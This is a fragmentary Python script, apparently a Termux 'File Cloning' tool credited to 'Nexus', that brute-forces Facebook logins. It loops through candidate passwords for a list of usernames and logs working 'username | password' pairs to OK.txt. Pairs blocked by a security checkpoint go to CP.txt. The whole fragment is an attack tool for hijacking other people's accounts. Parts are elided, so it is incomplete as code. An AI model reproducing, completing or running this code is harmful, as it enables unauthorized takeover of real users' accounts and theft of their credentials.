...
\x1b[1;97m
    ...
    / |/ / __/ |/_/ / / / __/
  /    / _/_>  </ /_/ /\ \  
 /_/|_/___/_/|_|\____/___/  \033[1;32m      XD
\x1b[1;91m-----------------------------------------------
{Y}[~]{E} Author   : Nexus
{Y}[~]{E} Facebook : Símón
{Y}[~]{E} Tool     : File Cloning
\x1b[1;91m-----------------------------------------------"""
        ...
        for password in pswrd:
           ...
           'currently_logged_in_userid': '0',
            ...
            if 'session_key' in req:
                print(f'\r\r\033[1;32m [Nexus-OK] '+username+' | '+password)
                open('/sdcard/Nexus/OK.txt', 'a').write(username+' | '+password+'\n')
                successfull.append(username)
                break
            elif 'www.facebook.com' in req['error_msg']:
                print(f'\r\r\x1b[38;5;205m [Nexus-CP] '+username+' | '+password)
                open('/sdcard/Nexus/CP.txt', 'a').write(username+' | '+password+'\n')
